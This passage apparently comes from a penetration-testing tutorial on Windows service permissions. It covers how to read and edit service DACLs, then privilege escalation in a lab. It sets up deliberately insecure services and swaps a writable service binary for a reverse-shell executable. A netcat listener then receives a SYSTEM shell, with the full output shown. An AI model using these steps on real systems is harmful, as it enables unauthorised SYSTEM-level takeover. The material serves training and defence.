| LC               | SERVICE_QUERY_STATUS         | Query the SCM the current status of the service |
| SW               | SERVICE_ENUMERATE_DEPENDENTS | List dependent services                         |
| LO               | SERVICE_INTERROGATE          | Query the service its current status            |
| RC               | READ_CONTROL                 | Query the security descriptor of the service    |
| RP               | SERVICE_START                | Start the service                               |
| DT               | SERVICE_PAUSE_CONTINUE       | Pause/Resume the service                        |
| CR               | SERVICE_USER_DEFINED_CONTROL |                                                 |
| WD               | WRITE_DAC                    | Change the permissions of the service           |
| WO               | WRITE_OWNER                  | Change the ownership of the service             |
| WP               | SERVICE_STOP                 | Stop the service                                |
| DC               | SERVICE_CHANGE_CONFIG        | Change service configuration                    |
| SD               | DELETE                       | The right to delete the service                 |

As we can see, the `Built-in administrators` user has full permissions ([SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)), and it can do anything with this service.

### SysInternals AccessChk

Query the service permissions using AccessChk, and run this command from an **administrator** command prompt:

```powershell
C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -c "VulnService" -l
```

We'll see the following output:

```powershell
C:\Users\user>C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -c "VulnService" -l

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

VulnService
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
```

The above output is a representation of the SDDL (security descriptor).

### SysInternals PsService

Query the service permissions using PsService.exe or PsService64.exe, and run this command from an **administrator** command prompt:

```powershell
C:\Users\user>C:\Tools\SysInternalsSuite\psservice.exe security "VulnService"

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: VulnService
DISPLAY_NAME: VulnService
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
```

As we can see above, the output generated by AccessChk and PsService utilities is very friendly.

### SetACL.exe

The [SetACL.exe](https://helgeklein.com/setacl/) command-line application (by Helge Klein) is a fantastic command-line tool for automating permissions in Windows. SetACL allows us to alter and inspect ownership and permissions for the file system, registry, printers, network shares, and services, among other things. We can download it [here](https://helgeklein.com/download/#).

View the permissions of a service (e.g., VulnService service), run this command from a command-prompt running as **administrator**:

```powershell
C:\Users\user\Desktop\64 bit>.\SetACL.exe -on "VulnService" -ot srv -actn list
VulnService

   DACL(not_protected):
   SYSTEM   start_stop   allow   no_inheritance
   Administrators   full   allow   no_inheritance
   INTERACTIVE   read   allow   no_inheritance
   SERVICE   read   allow   no_inheritance


SetACL finished successfully.
```

-   `-on` : ObjectName
-   `-ot` : ObjectType
-   `-actn` : Action to take

We can also view the SDDL format:

```powershell
C:\Users\user\Desktop\64 bit>.\SetACL.exe -on "VulnService" -ot srv -actn list -lst "f:sddl"
"VulnService",2,"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"

SetACL finished successfully.
```

### Sysinternals Process Explorer

The Process Explorer tool from Windows Sysinternals can also be used to view and edit service permissions:

{{< image src="/images/posts/process-explorer.png" caption="Process Explorer " src_s="/images/posts/process-explorer.png" src_l="/images/posts/process-explorer.png" >}}

Discretionary Access Control Lists:

{{< image src="/images/posts/process-explorer-service-dacl.png" caption="Process Explorer DACL " src_s="/images/posts/process-explorer-service-dacl.png" src_l="/images/posts/process-explorer-service-dacl.png" >}}

### Process Hacker

The Process Hacker tool can also be used to view and edit service permissions:

{{< image src="/images/posts/process-hacker-service-dacl.png" caption="Process Hacker " src_s="/images/posts/process-hacker-service-dacl.png" src_l="/images/posts/process-hacker-service-dacl.png" >}}

### Service Security Editor

The [Service Security Editor](https://www.coretechnologies.com/products/ServiceSecurityEditor/) utility is a third-party freeware that let's us view configure service permissions very easily:

{{< image src="/images/posts/service-security-editor.png" caption="Service Security Editor " src_s="/images/posts/service-security-editor.png" src_l="/images/posts/service-security-editor.png" >}}

When can click on the `Open...` button and view or modify the permissions of the selected service:

{{< image src="/images/posts/service-security-editor-open.png" caption="Service Security Editor Open " src_s="/images/posts/service-security-editor-open.png" src_l="/images/posts/service-security-editor-open.png" >}}

## Modify service permissions

We can modify the service permissions in multiple ways. Let’s see a few methods.

### SC.exe

We can modify the permissions of a service with the `sc.exe sdset` command-line argument. We can give to the administrators full control permissions for a service, we’d use this SDDL string:

```powershell
D:(A;;CCLCSWLORC;;;AU)(A;;**CCDCLCSWRPWPDTLOCRSDRCWDWO**;;;BA)(A;;**CCDCLCSWRPWPDTLOCRSDRCWDWO**;;;SY)(A;;CCLCSWLORC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

We can apply this SDDL for the `VulnService` service from an **administrator** command prompt window:

```powershell
C:\Users\user\Desktop\64 bit>sc.exe sdset "VulnService" D:(A;;CCLCSWLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWLORC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
[SC] SetServiceObjectSecurity SUCCESS
```

We should get the message `[SC] SetServiceObjectSecurity SUCCESS` in the output as we can see above. Now, the **Administrators** group can start, stop, query, change the configuration, or even delete the service.

The service status buttons and the startup type options in `VulnService` properties are now available for the Administrators:

{{< image src="/images/posts/services-vulnservice-buttons.png" caption="Service Buttons " src_s="/images/posts/services-vulnservice-buttons.png" src_l="/images/posts/services-vulnservice-buttons.png" >}}

### Process Explorer

If the service is currently running, we can use the [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) tool to modify the service permissions.

We'll launch **Process Explorer** as administrator and then double-click the `VulnService.exe` process:

{{< image src="/images/posts/process-explorer-edit-1.png" caption="Process Explorer Edit Service " src_s="/images/posts/process-explorer-edit-1.png" src_l="/images/posts/process-explorer-edit-1.png" >}}

Go to the **Services** tab and click on the **Permissions** button:

{{< image src="/images/posts/process-explorer-edit-2.png" caption="Process Explorer Edit Service " src_s="/images/posts/process-explorer-edit-2.png" src_l="/images/posts/process-explorer-edit-2.png" >}}

Now in the Permissions dialog click **Advanced**:

{{< image src="/images/posts/process-explorer-edit-3.png" caption="Process Explorer Edit Service " src_s="/images/posts/process-explorer-edit-3.png" src_l="/images/posts/process-explorer-edit-3.png" >}}

Select Administrators and click **Edit**:

{{< image src="/images/posts/process-explorer-edit-4.png" caption="Process Explorer Edit Service " src_s="/images/posts/process-explorer-edit-4.png" src_l="/images/posts/process-explorer-edit-4.png" >}}

In the Permission Entry dialog there are two options:

- Basic Permissions: Grouped permissions / simplified permissions 

- Advanced Permissions: Each permission separately

These is the view of the advanced permissions:

{{< image src="/images/posts/process-explorer-edit-5.png" caption="Process Explorer Edit Service " src_s="/images/posts/process-explorer-edit-5.png" src_l="/images/posts/process-explorer-edit-5.png" >}}

### Process Hacker

The Process Hacker tool can also be used to view and edit service permissions:

{{< image src="/images/posts/process-hacker-service-dacl.png" caption="Process Explorer Edit Service " src_s="/images/posts/process-hacker-service-dacl.png" src_l="/images/posts/process-hacker-service-dacl.png" >}}

### Service Security Editor

The **Service Security Editor** (ServiceSecurityEditor.exe), is a digitally signed executable from Core Technologies Consulting, LLC, which can be used to view and set permissions for any Windows service. We can download this program from [here](https://www.coretechnologies.com/products/ServiceSecurityEditor/).

Select the service from the list and click on the `Open…` button:

{{< image src="/images/posts/service-security-editor-1.png" caption="Process Explorer Edit Service " src_s="/images/posts/service-security-editor-1.png" src_l="/images/posts/service-security-editor-1.png" >}}

This opens the Security settings dialog where we can set the permissions for the chosen service:

{{< image src="/images/posts/service-security-editor-settings-2.png" caption="Process Explorer Edit Service " src_s="/images/posts/service-security-editor-settings-2.png" src_l="/images/posts/service-security-editor-settings-2.png" >}}

Then we can click **OK** and click **Done** to save our settings.

### SetACL.exe

The [SetACL.exe](https://helgeklein.com/setacl/) command-line application (by Helge Klein) is a fantastic command-line tool for automating permissions in Windows. SetACL allows us to alter and inspect ownership and permissions for the file system, registry, printers, network shares, and services, among other things. We can download it [here](https://helgeklein.com/download/#).

> Note: If we need to assign granular permissions (e.g., grant `SERVICE_START` but not `SERVICE_STOP`, or the other way around) for a user or group, then SetACL is not our best option. We can use one of the other methods described before.

We can edit the permissions of a service (e.g., VulnService service), and run this command from a command-prompt running as **administrator**:

```powershell
C:\Users\user\Desktop\64 bit>SetACL.exe -on "VulnService" -ot srv -actn ace -ace "n:administrators;p:full"
Processing ACL of: <VulnService>

SetACL finished successfully.
```

These are the description of the options used:

- `-on`: Object Name
- `-ot`: Object Type
- `-actn`: Action to take
- `-ace`: Set permissions/ACE
- `n`: Principal (Account or group name)
- `p`: Permissions
- `full`: full control permissions. This means `SERVICE_ALL_ACCESS`.

> Note: We can view a complete list of the command-line switches atthe official [SetACL.exe documentation](https://helgeklein.com/setacl/documentation/command-line-version-setacl-exe/) at Helge’s site.

SetACL supports only three permissions levels, which are `read`, `start_stop`, and `full`. These are the details about each permission level:

**read**

-   SERVICE_ENUMERATE_DEPENDENTS
-   SERVICE_INTERROGATE
-   SERVICE_QUERY_CONFIG
-   SERVICE_QUERY_STATUS
-   SERVICE_USER_DEFINED_CONTROL
-   READ_CONTROL

**start_stop**

-   SERVICE_ENUMERATE_DEPENDENTS
-   SERVICE_INTERROGATE
-   SERVICE_PAUSE_CONTINUE
-   SERVICE_QUERY_CONFIG
-   SERVICE_QUERY_STATUS
-   SERVICE_START
-   SERVICE_STOP
-   SERVICE_USER_DEFINED_CONTROL
-   READ_CONTROL

**full**

-   SERVICE_CHANGE_CONFIG
-   SERVICE_ENUMERATE_DEPENDENTS
-   SERVICE_INTERROGATE
-   SERVICE_PAUSE_CONTINUE
-   SERVICE_QUERY_CONFIG
-   SERVICE_QUERY_STATUS
-   SERVICE_START
-   SERVICE_STOP
-   SERVICE_USER_DEFINED_CONTROL
-   READ_CONTROL
-   WRITE_OWNER
-   WRITE_DAC DELETE


# Services Problems For The Attacker

The compromised user must be able to either restart the service or restart the machine to apply the changes made for a particular service. Because of this, we as attackers must enumerate the permissions of the service first and verify if our current compromised user has the `SeShutdownPrivilege` token enabled. We only need one of these options to abuse services **or** wait for a user to restart the system.

Another important detail to point out is that a group policy can be made to prevent users from restarting or shutting down the system, [this article goes into the details](http://woshub.com/allow-prevent-non-admin-users-reboot-shutdown-windows/).

# Services Payloads

In this article I will be using msfvenom to generate payloads, however, in the real world, we would use implants instead or at least encrypted payloads that can bypass AVs. We don't need to necessarily achieve a reverse shell, we could also add some high-privileged users such as administrators users, add persistence techniques, or do some damage to the system which is NOT recommended.

# Privilege Escalation via Insecure Service Executables

If the service executable is writable or modifiable we can replace the original service executables with one of our own. Our executable could be an implant, a payload or an encrypted payload. However, we should create a backup of the original executable before replacing it with our executable.

## Configuration

Open an **administrator** command prompt or a PowerShell console as **administrator** and create the directory that we will use for the service path:

```powershell
C:\Tools>md "C:\Program Files\Insecure Service Executable"
```

Copy the service executable file to the path of the service:

```powershell
C:\Tools>copy "C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe" "C:\Program Files\Insecure Service Executable\VulnService.exe"
        1 file(s) copied.
```

Grant full permissions to the executable:

```powershell
C:\Tools>icacls "C:\Program Files\Insecure Service Executable\VulnService.exe" /grant "Authenticated Users:F"
processed file: C:\Program Files\Insecure Service Executable\VulnService.exe
Successfully processed 1 files; Failed processing 0 files
```

Create the **insecure executable service**:

```powershell
C:\Tools>sc create "Insecure VulnService Executable" binpath= "\"C:\Program Files\Insecure Service Executable\VulnService.exe"\" type= own displayname= "Insecure VulnService Executable"
[SC] CreateService SUCCESS
```

> Note: To create a quoted path we must add "\ at the start of the binpath value. Example: "\"C:\Path To\Executablee"" or "\"C:\Path To\Executable"\".
> 
> If we just add a vlue like "C:\Path To\Executable" then the service will be unquoted.

Set the service access rights:

```powershell
C:\Tools>sc sdset "Insecure VulnService Executable" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
[SC] SetServiceObjectSecurity SUCCESS
```

Start the service:

```powershell
C:\Tools>sc start "Insecure VulnService Executable"

SERVICE_NAME: Insecure VulnService Executable
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 13036
        FLAGS              :
```

## Privilege Escalation

Notice that the `Authenticated Users` group has the `FILE_ALL_ACCESS` permission on the `VulnService.exe` file. Now let's query the `Insecure VulnService Executable` service and note that it runs with SYSTEM privileges:

```powershell
C:\Users\user>sc qc "Insecure VulnService Executable"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Insecure VulnService Executable
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Service Executable\VulnService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure VulnService Executable
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Using `accesschk.exe` we can see that the service executable file is writable by everyone from the `BINARY_PATH_NAME`:

```powershell
C:\Users\user>C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -quvw "C:\Program Files\Insecure Service Executable"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Insecure Service Executable\VulnService.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\Authenticated Users
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS

```

Verify if we can restart the service:

```powershell
C:\Users\user>C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -uvqc "Insecure VulnService Executable"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

Insecure VulnService Executable
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  R  Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

Create a backup of the original executable:

```powershell
C:\Users\user>copy "C:\Program Files\Insecure Service Executable\VulnService.exe" C:\Temp
Overwrite C:\Temp\VulnService.exe? (Yes/No/All): Yes
        1 file(s) copied.
```

Stop the service:

```powershell
C:\Users\user>sc stop "Insecure VulnService Executable"

SERVICE_NAME: Insecure VulnService Executable
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Copy the `reverse.exe` executable you created and replace the `VulnService.exe` with it:

```powershell
C:\Users\user>copy C:\Tools\reverse.exe "C:\Program Files\Insecure Service Executable\VulnService.exe"
Overwrite C:\Program Files\Insecure Service Executable\VulnService.exe? (Yes/No/All): Yes
        1 file(s) copied.
```

Then in the attacker host, we'll set up a `nc` listener:

```shell
nc -lvnp 443
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```powershell
C:\Users\user>net start "Insecure VulnService Executable"
# IT HANGS HERE
```

We have escalated privileges to `NT AUTHORITY\SYSTEM`:

```powershell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.27.128] from (UNKNOWN) [192.168.27.129] 50997
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

We're gonna delete this service from an **administrator** command prompt:

```powershell
C:\Tools>sc delete "Insecure VulnService Executable"
[SC] DeleteService SUCCESS
```

## Defense

Make sure that the executable permissions restrict a user from replacing it.

# Privilege Escalation via Insecure Service Permissions

If our user has permission to change the configuration of a service that runs as LocalSystem (`NT AUTHORITY\SYSTEM`), we can replace the executable of the service with one of our own, this could something such as an implant, payload, or an encrypted payload. However, we must consider if we have privileges to stop/start or restart the service, if not we could try to see if we have the `SeShutdownPrivilege` token enabled so that we can restart the system. If not we will have to wait for an end user or an administrator to restart the system for us.

These are the most dangerous access rights that a service can have:
- SERVICE_START
- SERVICE_STOP
- SERVICE_CHANGE_CONFIG
- SERVICE_ALL_ACCESS

## Configuration

Open an **administrator** command prompt or a PowerShell console as **administrator** and create the directory that we will use for the service path:

```powershell
C:\Windows\system32> md "C:\Program Files\Insecure DACL Service\"
```

Copy the service file to the path:

```powershell
PS C:\Windows\system32> copy "C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe" "C:\Program Files\Insecure DACL Service\VulnService.exe"
```

Grant full permissions to the executable:

```powershell
PS C:\Windows\system32> icacls "C:\Program Files\Insecure DACL Service\VulnService.exe" /grant BUILTIN\Users:F
processed file: C:\Program Files\Insecure DACL Service\VulnService.exe
Successfully processed 1 files; Failed processing 0 files
```

Create the DACL service (command prompt as administrator):

```powershell
C:\Tools>sc create "DACL VulnService" binpath= "\"C:\Program Files\Insecure DACL Service\VulnService.exe"" type= own displayname= "DACL VulnService"
[SC] CreateService SUCCESS

C:\Tools>sc qc "DACL VulnService"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: DACL VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure DACL Service\VulnService.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL VulnService
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> Note: To create a quoted path we must add "\ at the start of the `binpath` value. Example: "\"C:\Path To\Executable"" or "\"C:\Path To\Executable"\".
> 
> If we just add a value like "C:\Path To\Executable" then the service will be unquoted.

Set the service access rights through the service's security descriptor which uses the [Service Descriptor Definition Language (SDDL)](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language). We're gonna use the [ACE Strings](https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings) to set the access rights which uses the following syntax: 

```powershell
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
```

Knowing this we're gonna set the access rights:

```powershell
C:\Windows\system32>sc sdset "DACL VulnService" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
[SC] SetServiceObjectSecurity SUCCESS
```

*What do all these ACE strings mean?*

- S:  System Access Control List (SACL)
- D: Discretionary ACL (DACL)

*The first letter after brackets means: allow (**A**) or deny (**D**).**

*The next set of symbols are assignable access rights.**

- CC  SERVICE_QUERY_CONFIG 
- LC  SERVICE_QUERY_STATUS 
- SW SERVICE_ENUMERATE_DEPENDENTS
- LO SERVICE_INTERROGATE
- CR  SERVICE_USER_DEFINED_CONTROL
- RC  READ_CONTROL
- RP  SERVICE_START
- WP SERVICE_STOP
- DT  SERVICE_PAUSE_CONTINUE

*The last two characters are the objects (user, group, or SID) that are granted permissions. There is a list of predefined groups.**

- AU Authenticated Users
- AO Account operators
- RU Alias to allow previous Windows 2000
- AN Anonymous logon
- AU Authenticated users
- BA Built-in administrators
- BG Built-in guests
- BO Backup operators
- BU Built-in users
- CA Certificate server administrators
- CG Creator group
- CO Creator owner
- DA Domain administrators
- DC Domain computers
- DD Domain controllers
- DG Domain guests
- DU Domain users
- EA Enterprise administrators
- ED Enterprise domain controllers
- WD Everyone
- PA Group Policy administrators
- IU Interactively logged-on user
- LA Local administrator
- LG Local guest
- LS Local service account
- SY Local system
- NU Network logon user
- NO Network configuration operators
- NS Network service account
- PO Printer operators
- PS Personal self
- PU Power users
- RS RAS servers group
- RD Terminal server users
- RE Replicator
- RC Restricted code
- SA Schema administrators
- SO Server operators
- SU Service logon user

We can also convert an SDDL string to a custom object with:

```powershell
PS C:\Users\user> ConvertFrom-SddlString "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"


Owner            :
Group            :
DiscretionaryAcl : {Everyone: AccessAllowed (CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes,
                   ReadExtendedAttributes, ReadPermissions, Traverse, WriteData, WriteExtendedAttributes, WriteKey), NT AUTHORITY\SYSTEM: AccessAllowed (CreateDirectories,
                   DeleteSubdirectoriesAndFiles, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes,
                   ReadPermissions, Traverse, WriteAttributes, WriteExtendedAttributes), BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete,
                   DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute,
                   ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)}
SystemAcl        : {Everyone: SystemAudit FailedAccess (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute,
                   GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write,
                   WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

> Note: According to [MSDN](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) the `ConvertFrom-SddlString` cmdlet converts a Security Descriptor Definition Language string to a custom **PSCustomObject** object with the following properties: Owner, Group, DiscretionaryAcl, SystemAcl and RawDescriptor.

Alternatively, we can use PowerShell 7.2 to set an SDDL string:

```powershell
$SDDL = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)" 

Set-Service -Name "DACL VulnService" -SecurityDescriptorSddl $SDDL
```

Alternatively, we could also use the [SubinACL](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) provided by the [Windows Resource Toolkit](https://en.wikipedia.org/wiki/Resource_Kit). SubInACL is a Microsoft command-line program for working with Windows security permissions. It allows us to change the permissions of files, folders, registry keys, services, printers, cluster shares, and a variety of other objects. 

After we have downloaded and extracted Windows Resource Kit, we shall change to the directory:

```powershell
cd "C:\Program Files (x86)\Windows Resource Kits\Tools"
```

We're gonna give a user the access rights to suspend (pause/continue), start, and stop (restart) a service in this scenario. 

```powershell
subinacl.exe /service "DACL VulnService" /grant=DESKTOP-XXX\user=PTO
```

The following is a complete list of service permissions:

| A                              | B                                        |
|--------------------------------|------------------------------------------|
| F: Full Control                | E: Enumerate Dependent Services          |
| R: Generic Read                | C: Service Change Configuration          |
| W: Generic Write               | T: Start Service                         |
| X: Generic Execute             | O: Stop Service                          |
| L: Read Control                | P: Pause/Continue Service                 |
| Q: Query Service Configuration | I: Interrogate Service                   |
| S: Query Service Status        | U: Service User-Defined Control Commands |


Start the service:

```powershell
C:\Windows\system32>sc start "DACL VulnService"                                                                                                                                                         SERVICE_NAME: DACL VulnService                                                                              TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 12876
        FLAGS              :
```

## Privilege Escalation

Let's verify if we can restart the service:

```powershell
C:\Tools>C:\Tools\SysInternalsSuite\accesschk.exe /accepteula -uvqc "DACL VulnService"

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

DACL VulnService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
